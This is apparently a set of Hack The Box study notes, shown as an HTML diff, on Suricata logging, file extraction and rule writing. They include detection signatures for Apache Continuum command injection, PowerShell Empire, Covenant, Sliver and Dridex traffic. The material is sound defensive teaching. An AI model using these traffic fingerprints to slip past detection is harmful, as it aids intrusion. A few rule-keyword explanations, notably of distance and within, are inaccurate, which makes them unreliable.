+    <li><em>pcap_cnt: This is a counter that Suricata increments for each packet it processes from the network traffic or from a PCAP file (in offline mode). pcap_cnt allows us to trace a packet back to its original order in the PCAP file or network stream. This is beneficial in understanding the sequence of network events as they occurred. It can help to precisely pinpoint when an alert was triggered in relation to other packets, which can provide valuable context in an investigation.</em></li>
+    <li>fast.log: This is a text-based log format that records alerts only and is enabled by default. Try inspecting the content of old_fast.log residing at /var/log/suricata as follows.</li>
+  </ul>
+</blockquote>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cat</span> /var/log/suricata/old_fast.log
+07/06/2023-08:34:35.003163  <span class="o">[</span><span class="k">**</span><span class="o">]</span> <span class="o">[</span>1:1:0] Known bad DNS lookup, possible Dridex infection <span class="o">[</span><span class="k">**</span><span class="o">]</span> <span class="o">[</span>Classification: <span class="o">(</span>null<span class="o">)]</span> <span class="o">[</span>Priority: 3] <span class="o">{</span>UDP<span class="o">}</span> 10.9.24.101:51833 -&gt; 10.9.24.1:53
+stats.log: This is a human-readable statistics log, which can be particularly useful <span class="k">while </span>debugging Suricata deployments. Try inspecting the content of old_stats.log residing at /var/log/suricata as follows.
+</code></pre></div></div>
+
+<ul>
+  <li>stats.log: This is a human-readable statistics log, which can be particularly useful while debugging Suricata deployments. Try inspecting the content of old_stats.log residing at /var/log/suricata as follows.</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cat</span> /var/log/suricata/old_stats.log
+<span class="nt">------------------------------------------------------------------------------------</span>
+Date: 7/6/2023 <span class="nt">--</span> 08:34:24 <span class="o">(</span><span class="nb">uptime</span>: 0d, 00h 00m 08s<span class="o">)</span>
+<span class="nt">------------------------------------------------------------------------------------</span>
+Counter                                       | TM Name                   | Value
+<span class="nt">------------------------------------------------------------------------------------</span>
+capture.kernel_packets                        | Total                     | 4
+decoder.pkts                                  | Total                     | 3
+decoder.bytes                                 | Total                     | 212
+decoder.ipv6                                  | Total                     | 1
+decoder.ethernet                              | Total                     | 3
+decoder.icmpv6                                | Total                     | 1
+decoder.avg_pkt_size                          | Total                     | 70
+decoder.max_pkt_size                          | Total                     | 110
+flow.icmpv6                                   | Total                     | 1
+flow.wrk.spare_sync_avg                       | Total                     | 100
+flow.wrk.spare_sync                           | Total                     | 1
+flow.mgr.full_hash_pass                       | Total                     | 1
+flow.spare                                    | Total                     | 9900
+tcp.memuse                                    | Total                     | 606208
+tcp.reassembly_memuse                         | Total                     | 98304
+flow.memuse                                   | Total                     | 7394304
+<span class="nt">------------------------------------------------------------------------------------</span>
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<h3 id="file-extraction-with-suricata">File extraction with suricata+</h3>
+
+<p>In <code class="language-plaintext highlighter-rouge">suricata.yml</code> we need to make enable file-extraction</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">file-store</span><span class="pi">:</span>
+  <span class="na">version</span><span class="pi">:</span> <span class="m">2</span>
+  <span class="na">enabled</span><span class="pi">:</span> <span class="s">yes</span>
+  <span class="na">force-filestore</span><span class="pi">:</span> <span class="s">yes</span>
+</code></pre></div></div>
+
+<p>We can create a <code class="language-plaintext highlighter-rouge">local.rule</code> that has the configuration of an alert to make this file extraction</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert http any any -&gt; any any <span class="o">(</span>msg:<span class="s2">"FILE store all"</span><span class="p">;</span> filestore<span class="p">;</span> sid:2<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>With this configuration we can make a file-extraction</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>suricata <span class="nt">-r</span> /home/htb-student/pcaps/vm-2.pcap
+7/7/2023 <span class="nt">--</span> 06:25:57 - &lt;Notice&gt; - This is Suricata version 6.0.13 RELEASE running <span class="k">in </span>USER mode
+7/7/2023 <span class="nt">--</span> 06:25:57 - &lt;Notice&gt; - all 3 packet processing threads, 4 management threads initialized, engine started.
+7/7/2023 <span class="nt">--</span> 06:25:57 - &lt;Notice&gt; - Signal Received.  Stopping engine.
+7/7/2023 <span class="nt">--</span> 06:25:57 - &lt;Notice&gt; - Pcap-file module <span class="nb">read </span>1 files, 803 packets, 683915 bytes
+We will notice that eve.json, fast.log, stats.log, and suricata.log were created, alongside a new directory called filestore. filestore<span class="s1">'s content in terms of the files it contains can be inspected as follows.
+</span></code></pre></div></div>
+
+<p>We recieved a lot of files for each http response. There we can read them with <code class="language-plaintext highlighter-rouge">xxd</code>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cd </span>filestore
+gu3ro@htb[/htb]<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+./fb/fb20d18d00c806deafe14859052072aecfb9f46be6210acfce80289740f2e20e
+./21/214306c98a3483048d6a69eec6bf3b50497363bc2c98ed3cd954203ec52455e5
+./21/21742fc621f83041db2e47b0899f5aea6caa00a4b67dbff0aae823e6817c5433
+./26/2694f69c4abf2471e09f6263f66eb675a0ca6ce58050647dcdcfebaf69f11ff4
+./2c/2ca1a0cd9d8727279f0ba99fd051e1c0acd621448ad4362e1c9fc78700015228
+./7d/7d4c00f96f38e0ffd89bc2d69005c4212ef577354cc97d632a09f51b2d37f877
+./6b/6b7fee8a4b813b6405361db2e70a4f5a213b34875dd2793667519117d8ca0e4e
+./2e/2e2cb2cac099f08bc51abba263d9e3f8ac7176b54039cc30bbd4a45cfa769018
+./50/508c47dd306da3084475faae17b3acd5ff2700d2cd85d71428cdfaae28c9fd41
+./c2/c210f737f55716a089a33daf42658afe771cfb43228ffa405d338555a9918815
+./ea/ea0936257b8d96ee6ae443adee0f3dacc3eff72b559cd5ee3f9d6763cf5ee2ab
+./1a/1aab7d9c153887dfa63853534f684e5d46ecd17ba60cd3d61050f7f231c4babb
+./c4/c4775e980c97b162fd15e0010663694c4e09f049ff701d9671e1578958388b9f
+./63/63de4512dfbd0087f929b0e070cc90d534d6baabf2cdfbeaf76bee24ff9b1638
+./48/482d9972c2152ca96616dc23bbaace55804c9d52f5d8b253b617919bb773d3bb
+./8e/8ea3146c676ba436c0392c3ec26ee744155af4e4eca65f4e99ec68574a747a14
+./8e/8e23160cc504b4551a94943e677f6985fa331659a1ba58ef01afb76574d2ad7c
+./a5/a52dac473b33c22112a6f53c6a625f39fe0d6642eb436e5d125342a24de44581
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cd </span>filestore
+gu3ro@htb[/htb]<span class="nv">$ </span>xxd ./21/21742fc621f83041db2e47b0899f5aea6caa00a4b67dbff0aae823e6817c5433 | <span class="nb">head
+</span>00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
+00000010: b800 0000 0000 0000 4000 0000 e907 0000  ........@.......
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
+00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
+00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno
+00000060: 7420 6265 2072 756e 2069 6e20 444f 5320  t be run <span class="k">in </span>DOS
+00000070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000  mode....<span class="nv">$.</span>......
+00000080: 5045 0000 4c01 0300 fc90 8448 0000 0000  PE..L......H....
+00000090: 0000 0000 e000 0f01 0b01 0600 00d0 0000  ................
+</code></pre></div></div>
+
+<h3 id="suricata-rule-development">Suricata Rule Development</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>action protocol from_ip port -&gt; to_ip port <span class="o">(</span>msg:<span class="s2">"Known malicious behavior, possible X malware infection"</span><span class="p">;</span> content:<span class="s2">"some thing"</span><span class="p">;</span> content:<span class="s2">"some other thing"</span><span class="p">;</span> sid:10000001<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Header (action protocol from_ip port -&gt; to_ip port part): The header section of a rule encapsulates the intended action of the rule, along with the protocol where the rule is expected to be applied. Additionally, it includes IP addresses, port information, and an arrow indicating traffic directionality.</p>
+
+    <ul>
+      <li>action instructs Suricata on what steps to take if the contents match. This could range from generating an alert (alert), logging the traffic without an alert (log), ignoring the packet (pass), dropping the packet in IPS mode (drop), or sending TCP RST packets (reject).</li>
+      <li>protocol can vary, including tcp, udp, icmp, ip, http, tls, smb, or dns.</li>
+      <li>Traffic directionality is declared using rule host variables (such as $HOME_NET, $EXTERNAL_NET, etc. that we saw inside suricata.yaml) and rule direction. The direction arrow between the two IP-Port pairs informs Suricata about the traffic flow.
+        <ul>
+          <li>Examples:
+            <ul>
+              <li>Outbound: $HOME_NET any -&gt; $EXTERNAL_NET 9090</li>
+              <li>Inbound: $EXTERNAL_NET any -&gt; $HOME_NET 8443</li>
+              <li>Bidirectional: $EXTERNAL_NET any &lt;&gt; $HOME_NET any</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Rule ports define the ports at which the traffic for this rule will be evaluated.
+        <ul>
+          <li>Examples:</li>
+          <li>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET 9443</li>
+          <li>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $UNCOMMON_PORTS
+            <ul>
+              <li>$UNCOMMON_PORTS can be defined inside suricata.yaml</li>
+            </ul>
+          </li>
+          <li>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET [8443,8080,7001:7002,!8443]</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Rule message &amp; content ((msg:”Known malicious behavior, possible X malware infection”; content:”some thing”; content:”some other thing”; part): The rule message &amp; content section contains the message we wish to be displayed to the analysts or ourselves when an activity we want to be notified about is detected. content are the segments of the traffic that we deem essential for such detections.</p>
+
+    <ul>
+      <li>Rule message (msg) is an arbitrary text displayed when the rule is triggered. Ideally, the rule messages we create should contain details about malware architecture, family, and action.
+flow identifies the originator and responder. Always remember, when crafting rules, to have the engine monitor “established” tcp sessions.
+        <ul>
+          <li>Examples:
+            <ul>
+              <li>alert tcp any any -&gt; 192.168.1.0/24 22 (msg:”SSH connection attempt”; flow:to_server; sid:1001;)</li>
+              <li>alert udp 10.0.0.0/24 any -&gt; any 53 (msg:”DNS query”; flow:from_client; sid:1002;)</li>
+              <li>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET 80 (msg:”Potential HTTP-based attack”; flow:established,to_server; sid:1003;)</li>
+            </ul>
+          </li>
+          <li>dsize matches using the payload size of the packet. It relies on TCP segment length, not the total packet length.
+            <ul>
+              <li>Example: alert http any any -&gt; any any (msg:”Large HTTP response”; dsize:&gt;10000; content:”HTTP/1.1 200 OK”; sid:2003;)</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Rule content comprises unique values that help identify specific network traffic or activities. Suricata matches these unique content values in packets for detection.
+        <ul>
+          <li>Example: content:”User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip”;
+            <ul>
+              <li>|3a 20|: This represents the hexadecimal representation of the characters “:”, followed by a space character. It is used to match the exact byte sequence in the packet payload.</li>
+              <li>|0d 0a|: This represents the hexadecimal representation of the characters “\r\n”, which signifies the end of a line in HTTP headers.</li>
+            </ul>
+          </li>
+          <li>By using Rule Buffers, we don’t have to search the entire packet for every content match. This saves time and resources.
+            <ul>
+              <li>Example: alert http any any -&gt; any any (http.accept; content:”image/gif”; sid:1;)</li>
+              <li>http.accept: Sticky buffer to match on the HTTP Accept header. Only contains the header value. The \r\n after the header are not part of the buffer.</li>
+              <li>Rule options act as additional modifiers to aid detection, helping Suricata locate the exact location of contents.
+                <ul>
+                  <li>nocase ensures rules are not bypassed through case changes.
+                    <ul>
+                      <li>Example: alert tcp any any -&gt; any any (msg:”Detect HTTP traffic with user agent Mozilla”; content:”User-Agent: Mozilla”; nocase; sid:8001;)</li>
+                    </ul>
+                  </li>
+                  <li>offset informs Suricata about the start position inside the packet for matching.
+                    <ul>
+                      <li>Example: alert tcp any any -&gt; any any (msg:”Detect specific protocol command”; content:”|01 02 03|”; offset:0; depth:5; sid:3003;)</li>
+                      <li>This rule triggers an alert when Suricata detects a specific protocol command represented by the byte sequence |01 02 03| in the TCP payload. The offset:0 keyword sets the content match to start from the beginning of the payload, and depth:5 specifies a length of five bytes to be considered for matching.</li>
+                    </ul>
+                  </li>
+                  <li>distance tells Suricata to look for the specified content n bytes relative to the previous match.
+                    <ul>
+                      <li>Example: alert tcp any any -&gt; any any (msg:”Detect suspicious URL path”; content:”/admin”; offset:4; depth:10; distance:20; within:50; sid:3001;)</li>
+                      <li>This rule triggers an alert when Suricata detects the string /admin in the TCP payload, starting from the fifth byte (offset:4) and considering a length of ten bytes (depth:10). The distance:20 keyword specifies that subsequent matches of /admin should not occur within the next 20 bytes after a previous match. The within:50 keyword ensures that the content match occurs within the next 50 bytes after a previous match.</li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Rule metadata (sid:10000001; rev:1; part):</p>
+
+    <ul>
+      <li>reference provides us with a lead, a trail that takes us back to the original source of information that inspired the creation of the rule.</li>
+      <li>sid (signature ID). The unique quality of this numeric identifier makes it essential for the rule writer to manage and distinguish between rules.</li>
+      <li>revision offers insights into the rule’s version. It serves as an indicator of the evolution of the rule over time, highlighting modifications and enhancements made.</li>
+    </ul>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert http any any -&gt; <span class="nv">$HOME_NET</span> any <span class="o">(</span>msg: <span class="s2">"ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection"</span><span class="p">;</span> content: <span class="s2">"POST"</span><span class="p">;</span> http_method<span class="p">;</span> content: <span class="s2">"/continuum/saveInstallation.action"</span><span class="p">;</span> offset: 0<span class="p">;</span> depth: 34<span class="p">;</span> http_uri<span class="p">;</span> content: <span class="s2">"installation.varValue="</span><span class="p">;</span> nocase<span class="p">;</span> http_client_body<span class="p">;</span> pcre: <span class="o">!</span><span class="s2">"/^</span><span class="se">\$</span><span class="s2">?[</span><span class="se">\s</span><span class="s2">a-z</span><span class="se">\\</span><span class="s2">_0-9.-]*(</span><span class="se">\&amp;</span><span class="s2">|</span><span class="nv">$)</span><span class="s2">/iRP"</span><span class="p">;</span> flow: to_server, established<span class="p">;</span>sid: 10000048<span class="p">;</span> rev: 1<span class="p">;</span><span class="o">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Firstly, the rule triggers on HTTP traffic (alert http) from any source and destination to any port on the home network (any any -&gt; $HOME_NET any).</li>
+  <li>The msg field gives a human-readable description of what the alert is for, namely ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection.</li>
+  <li>Next, the rule checks for the POST string in the HTTP method using the content and http_method keywords. The rule will match if the HTTP method used is a POST request.</li>
+  <li>The content keyword is then used with http_uri to match the URI /continuum/saveInstallation.action, starting at offset 0 and going to a depth of 34 bytes. This specifies the targeted endpoint, which in this case is the saveInstallation action of the Apache Continuum application.</li>
+  <li>Following this, another content keyword searches for installation.varValue= in the HTTP client body, case insensitively (nocase). This string may be part of the command injection payload that the attacker is trying to deliver.</li>
+  <li>Next, we see a pcre keyword, which is used to implement Perl Compatible Regular Expressions.
+    <ul>
+      <li>^ marks the start of the line.</li>
+      <li>$? checks for an optional dollar sign at the start.</li>
+      <li>[\sa-z\_0-9.-]* matches zero or more (*) of the characters in the set. The set includes:
+        <ul>
+          <li>\s a space</li>
+          <li>a-z any lowercase letter</li>
+          <li>\ a backslash</li>
+          <li>_ an underscore</li>
+          <li>0-9 any digit</li>
+          <li>. a period</li>
+          <li>- a hyphen</li>
+          <li>(\&amp;|$) checks for either an ampersand or the end of the line.</li>
+          <li>/iRP at the end indicates this is an inverted match (meaning the rule triggers when the match does not occur), case insensitive (i), and relative to the buffer position (RP).</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Finally, the flow keyword is used to specify that the rule triggers on established, inbound traffic towards the server</li>
+</ul>
+
+<h4 id="example-1">Example 1</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert http <span class="nv">$HOME_NET</span> any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"ET MALWARE Possible PowerShell Empire Activity Outbound"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"GET"</span><span class="p">;</span> http_method<span class="p">;</span> content:<span class="s2">"/"</span><span class="p">;</span> http_uri<span class="p">;</span> depth:1<span class="p">;</span> pcre:<span class="s2">"/^(?:login</span><span class="se">\/</span><span class="s2">process|admin</span><span class="se">\/</span><span class="s2">get|news)</span><span class="se">\.</span><span class="s2">php</span><span class="nv">$/</span><span class="s2">RU"</span><span class="p">;</span> content:<span class="s2">"session="</span><span class="p">;</span> http_cookie<span class="p">;</span> pcre:<span class="s2">"/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})</span><span class="nv">$/</span><span class="s2">CRi"</span><span class="p">;</span> content:<span class="s2">"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"</span><span class="p">;</span> http_user_agent<span class="p">;</span> http_start<span class="p">;</span> content:<span class="s2">".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="</span><span class="p">;</span> fast_pattern<span class="p">;</span> http_header_names<span class="p">;</span> content:!<span class="s2">"Referer"</span><span class="p">;</span> content:!<span class="s2">"Cache"</span><span class="p">;</span> content:!<span class="s2">"Accept"</span><span class="p">;</span> sid:2027512<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>alert: This is the rule action, indicating that Suricata should generate an alert whenever the conditions specified in the rule options are met.</li>
+  <li>http: This is the rule protocol. It specifies that the rule applies to HTTP traffic.</li>
+  <li>$HOME_NET any -&gt; $EXTERNAL_NET any: These are the source and destination IP address specifications. The rule will be triggered when HTTP traffic originates from any port (any) on a host within the $HOME_NET (internal network) and is destined to any port (any) on a host in the $EXTERNAL_NET (external network).</li>
+  <li>msg:”ET MALWARE Possible PowerShell Empire Activity Outbound”: This is the message that will be included in the alert to describe what the rule is looking for.</li>
+  <li>flow:established,to_server: This specifies the direction of the traffic. The rule is looking for established connections where data is flowing to the server.</li>
+  <li>content:”GET”; http_method;: This matches the HTTP GET method in the HTTP request.</li>
+  <li>content:”/”; http_uri; depth:1;: This matches the root directory (“/”) in the URI.</li>
+  <li>pcre:”/^(?:login\/process|admin\/get|news).php$/RU”;: This Perl Compatible Regular Expression (PCRE) is looking for URIs that end with login/process.php, admin/get.php, or news.php.
+    <ul>
+      <li>PowerShell Empire is an open-source Command and Control (C2) framework. Its agent can be explored via the following repository.https://github.com/EmpireProject/Empire/blob/master/data/agent/agent.ps1#L78</li>
+      <li>Examine the psempire.pcap file which is located in the /home/htb-student/pcaps directory of this section’s target using Wireshark to pinpoint the related requests.</li>
+    </ul>
+  </li>
+  <li>content:”session=”; http_cookie;: This is looking for the string “session=” in the HTTP cookie.</li>
+  <li>pcre:”/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi”;: This PCRE is checking for base64-encoded data in the Cookie.
+    <ul>
+      <li>A plethora of articles examining PowerShell Empire exist, here is one noting that the cookies utilized by PowerShell Empire adhere to the Base64 encoding standard. https://www.keysight.com/blogs/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side</li>
+    </ul>
+  </li>
+  <li>content:”Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1”; http_user_agent; http_start;: This matches a specific User-Agent string that includes “Mozilla/5.0 (Windows NT 6.1”.
+    <ul>
+      <li>https://github.com/EmpireProject/Empire/blob/master/data/agent/agent.ps1#L78</li>
+    </ul>
+  </li>
+  <li>content:”.php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session=”; fast_pattern; http_header_names;: This matches a pattern in the HTTP headers that starts with “.php HTTP/1.1\r\nCookie: session=”.</li>
+  <li>content:!”Referer”; content:!”Cache”; content:!”Accept”;: These are negative content matches. The rule will only trigger if the HTTP headers do not contain “Referer”, “Cache”, and “Accept”.</li>
+</ul>
+
+<h4 id="example-2">Example 2</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tcp any any -&gt; <span class="nv">$HOME_NET</span> any <span class="o">(</span>msg:<span class="s2">"detected by body"</span><span class="p">;</span> content:<span class="s2">"&lt;title&gt;Hello World!&lt;/title&gt;"</span><span class="p">;</span> detection_filter: track by_src, count 4 , seconds 10<span class="p">;</span> priority:1<span class="p">;</span> sid:3000011<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+<p>The (inefficient) Suricata rule above is designed to detect certain variations of Covenant, another common post-exploitation framework used by attackers. Let’s break down the important parts of this rule to understand its workings.</p>
+
+<ul>
+  <li>alert: This is the rule action. When the conditions in the rule options are met, Suricata will generate an alert.</li>
+  <li>tcp: This is the rule protocol. The rule applies to TCP traffic.</li>
+  <li>any any -&gt; $HOME_NET any: These are the source and destination IP address and port specifications. The rule is watching for TCP traffic that originates from any IP and any port (any any) and is destined for any port (any) on a host in the $HOME_NET (internal network).</li>
+  <li>content:”<title>Hello World!</title>”;: This instructs Suricata to look for the string <title>Hello World!</title> in the TCP payload.
+    <ul>
+      <li>Covenant is an open-source Command and Control (C2) framework. Its underpinnings can be explored via the following repository.https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Profiles/DefaultHttpProfile.yaml#L35</li>
+      <li>Examine the covenant.pcap file which is located in the /home/htb-student/pcaps directory of this section’s target using Wireshark to pinpoint the related requests.</li>
+    </ul>
+  </li>
+  <li>detection_filter: track by_src, count 4, seconds 10;: This is a post-detection filter. It specifies that the rule should track the source IP address (by_src) and will only trigger an alert if this same detection happens at least 4 times (count 4) within a 10-second window (seconds 10).
+    <ul>
+      <li>Examine the covenant.pcap file which is located in the /home/htb-student/pcaps directory of this section’s target using Wireshark to pinpoint the related requests.</li>
+      <li>This Suricata rule is designed to generate a high-priority alert if it detects at least four instances of TCP traffic within ten seconds that contain the string <title>Hello World!</title> in the payload, originating from the same source IP and headed towards any host on our internal network.</li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="example-3">Example 3</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tcp <span class="nv">$HOME_NET</span> any -&gt; any any <span class="o">(</span>msg:<span class="s2">"detected by size and counter"</span><span class="p">;</span> dsize:312<span class="p">;</span> detection_filter: track by_src, count 3 , seconds 10<span class="p">;</span> priority:1<span class="p">;</span> sid:3000001<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>dsize:312;: This instructs Suricata to look for TCP traffic with a data payload size of exactly 312 bytes.</li>
+  <li>detection_filter: track by_src, count 3 , seconds 10;: This is a post-detection filter. It says that the rule should keep track of the source IP address (by_src), and it will only trigger an alert if it detects the same rule hit at least 3 times (count 3) within a 10-second window (seconds 10).</li>
+</ul>
+
+<p>This Suricata rule is designed to generate a high-priority alert if it detects at least three instances of TCP traffic within ten seconds that each contain a data payload of exactly 312 bytes, all originating from the same source IP within our network and headed anywhere.</p>
+
+<h3 id="suricata-rule-development-encrypted-traffic">Suricata Rule Development (Encrypted Traffic)</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tls <span class="nv">$EXTERNAL_NET</span> any -&gt; <span class="nv">$HOME_NET</span> any <span class="o">(</span>msg:<span class="s2">"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"</span><span class="p">;</span> flow:established,from_server<span class="p">;</span> content:<span class="s2">"|16|"</span><span class="p">;</span> content:<span class="s2">"|0b|"</span><span class="p">;</span> within:8<span class="p">;</span> byte_test:3,&lt;,1200,0,relative<span class="p">;</span> content:<span class="s2">"|03 02 01 02 02 09 00|"</span><span class="p">;</span> fast_pattern<span class="p">;</span> content:<span class="s2">"|30 09 06 03 55 04 06 13 02|"</span><span class="p">;</span> distance:0<span class="p">;</span> pcre:<span class="s2">"/^[A-Z]{2}/R"</span><span class="p">;</span> content:<span class="s2">"|55 04 07|"</span><span class="p">;</span> distance:0<span class="p">;</span> content:<span class="s2">"|55 04 0a|"</span><span class="p">;</span> distance:0<span class="p">;</span> pcre:<span class="s2">"/^.{2}[A-Z][a-z]{3,}</span><span class="se">\s</span><span class="s2">(?:[A-Z][a-z]{3,}</span><span class="se">\s</span><span class="s2">)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:</span><span class="se">\.</span><span class="s2">[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:</span><span class="se">\.</span><span class="s2">[A-Za-z]){1,3})</span><span class="se">\.</span><span class="s2">?[01]/Rs"</span><span class="p">;</span> content:<span class="s2">"|55 04 03|"</span><span class="p">;</span> distance:0<span class="p">;</span> byte_test:1,&gt;,13,1,relative<span class="p">;</span> content:!<span class="s2">"www."</span><span class="p">;</span> distance:2<span class="p">;</span> within:4<span class="p">;</span> pcre:<span class="s2">"/^.{2}(?P&lt;CN&gt;(?:(?:</span><span class="se">\d</span><span class="s2">?[A-Z]?|[A-Z]?</span><span class="se">\d</span><span class="s2">?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})</span><span class="se">\.</span><span class="s2">){0,2}?(?:</span><span class="se">\d</span><span class="s2">?[A-Z]?|[A-Z]?</span><span class="se">\d</span><span class="s2">?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?</span><span class="se">\.</span><span class="s2">(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs"</span><span class="p">;</span> content:!<span class="s2">"|2a 86 48 86 f7 0d 01 09 01|"</span><span class="p">;</span> content:!<span class="s2">"GoDaddy"</span><span class="p">;</span> sid:2023476<span class="p">;</span> rev:5<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>The rule above triggers an alert upon detecting a TLS session from the external network to the home network, where the payload of the session contains specific byte patterns and meets several conditions. These patterns and conditions correspond to SSL certificates that have been linked to certain variations of the Dridex trojan, as referenced by the SSL blacklist on abuse.ch.</p>
+
+<p>No need to understand the rule in its entirety, but let’s break down the important parts of it.</p>
+
+<ul>
+  <li>content:”|16|”; content:”|0b|”; within:8;: The rule looks for the hex values 16 and 0b within the first 8 bytes of the payload. These represent the handshake message (0x16) and the certificate type (0x0b) in the TLS record.</li>
+  <li>content:”|03 02 01 02 02 09 00|”; fast_pattern;: The rule looks for this specific pattern of bytes in the packet, which may be characteristic of the certificates used by Dridex.</li>
+  <li>content:”|30 09 06 03 55 04 06 13 02|”; distance:0; pcre:”/^[A-Z]{2}/R”;: This checks for the ‘countryName’ field in the certificate’s subject. The content match here corresponds to an ASN.1 sequence specifying an attribute type and value for ‘countryName’ (OID 2.5.4.6). The following PCRE checks that the value for ‘countryName’ begins with two uppercase letters, which is a standard format for country codes.</li>
+  <li>content:”|55 04 07|”; distance:0;: This checks for the ‘localityName’ field in the certificate’s subject (OID 2.5.4.7).</li>
+  <li>content:”|55 04 0a|”; distance:0;: This checks for the organizationName field in the certificate’s subject (OID 2.5.4.10).</li>
+  <li>content:”|55 04 03|”; distance:0; byte_test:1,&gt;,13,1,relative;: This checks for the commonName field in the certificate’s subject (OID 2.5.4.3). The following byte_test checks that the length of the commonName field is more than 13.</li>
+</ul>
+
+<h4 id="example-4">Example 4</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tls any any -&gt; any any <span class="o">(</span>msg:<span class="s2">"Sliver C2 SSL"</span><span class="p">;</span> ja3.hash<span class="p">;</span> content:<span class="s2">"473cd7cb9faa642487833865d516e578"</span><span class="p">;</span> sid:1002<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>ja3 <span class="nt">-a</span> <span class="nt">--json</span> /home/htb-student/pcaps/sliverenc.pcap
+<span class="o">[</span>
+    <span class="o">{</span>
+        <span class="s2">"destination_ip"</span>: <span class="s2">"23.152.0.91"</span>,
+        <span class="s2">"destination_port"</span>: 443,
+        <span class="s2">"ja3"</span>: <span class="s2">"771,49195-49199-49196-49200-52393-52392-49161-49171-49162-49172-156-157-47-53-49170-10-4865-4866-4867,0-5-10-11-13-65281-18-43-51,29-23-24-25,0"</span>,
+        <span class="s2">"ja3_digest"</span>: <span class="s2">"473cd7cb9faa642487833865d516e578"</span>,
+        <span class="s2">"source_ip"</span>: <span class="s2">"10.10.20.101"</span>,
+        <span class="s2">"source_port"</span>: 53222,
+        <span class="s2">"timestamp"</span>: 1634749464.600896
+    <span class="o">}</span>,
+    <span class="o">{</span>
+        <span class="s2">"destination_ip"</span>: <span class="s2">"23.152.0.91"</span>,
+        <span class="s2">"destination_port"</span>: 443,
